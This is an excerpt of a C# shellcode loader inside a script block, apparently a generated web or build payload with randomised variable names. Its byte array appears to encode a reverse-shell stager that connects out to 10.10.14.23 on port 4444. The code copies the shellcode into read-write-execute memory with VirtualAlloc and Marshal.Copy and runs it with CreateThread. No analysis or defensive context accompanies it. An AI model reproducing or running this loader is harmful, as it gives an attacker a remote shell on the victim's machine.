...
0x68,0x0a,0x0a,0x0e,0x17,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr oUX1rdAW8 = VirtualAlloc(IntPtr.Zero,(UIntPtr)lZ29T9.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lZ29T9,0,oUX1rdAW8,lZ29T9.Length);
        IntPtr crcRx9PgsW4J = IntPtr.Zero;
        IntPtr edKu8FqLzu = CreateThread(IntPtr.Zero,UIntPtr.Zero,oUX1rdAW8,IntPtr.Zero,0,ref crcRx9PgsW4J);
    }
</script>
